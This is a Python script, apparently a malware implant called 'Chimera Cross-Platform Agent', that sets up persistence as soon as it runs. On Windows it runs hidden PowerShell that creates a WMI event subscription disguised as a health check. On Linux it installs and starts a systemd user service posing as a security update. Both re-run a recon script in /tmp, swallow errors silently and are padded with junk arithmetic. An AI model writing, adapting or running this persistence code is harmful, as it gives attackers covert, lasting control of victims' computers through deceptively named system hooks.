# Chimera Cross-Platform Agent
import os
import sys
import time
ppuxkopq = 443 * 11
ojzeqjcx = 440 * 49
txfaiyth = 954 * 22
umpyzajn = 662 * 28
nvwyjoaq = 637 * 38
vylonsbz = 343 * 44

# --- PERSISTENCE LAYER ---

def establish_windows_persistence():
    import subprocess
    ps_payload = r'''
    $F = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
        Name = 'WinMgmtHealthCheck';
        QueryLanguage = 'WQL';
        Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Minute = 5"
    }
    $C = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
        Name = 'WinMgmtHealthConsumer';
        CommandLineTemplate = 'python.exe /tmp/recon_0o4gz.py'
    }
    Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
        Filter = $F;
        Consumer = $C
    }
    '''
    subprocess.run(["powershell", "-WindowStyle", "Hidden", "-Command", ps_payload], capture_output=True)

import sys
if sys.platform == "win32":
    try:
        establish_windows_persistence()
    except:
        pass

def establish_linux_persistence():
    import os
    home = os.path.expanduser("~")
    svc_path = os.path.join(home, ".config/systemd/user")
    if not os.path.exists(svc_path):
        os.makedirs(svc_path)
    
    file_path = os.path.join(svc_path, "chimera-update.service")
    with open(file_path, "w") as f:
        f.write("[Unit]\nDescription=Chimera Security Update\nAfter=network.target\n\n[Service]\nExecStart=/usr/bin/python3 /tmp/recon_0o4gz.py\nRestart=always\nRestartSec=60\n\n[Install]\nWantedBy=default.target\n")
    
    os.system("systemctl --user daemon-reload")
    os.system("systemctl --user enable chimera-update.service")
    os.system("systemctl --user start chimera-update.service")

import sys
if sys.platform.startswith("linux"):
    try:
        establish_linux_persistence()
    except:
        pass

# --- OPERATIONAL TASK ---
print('Running cross-platform recon...')
mimvrvrw = 676 * 28
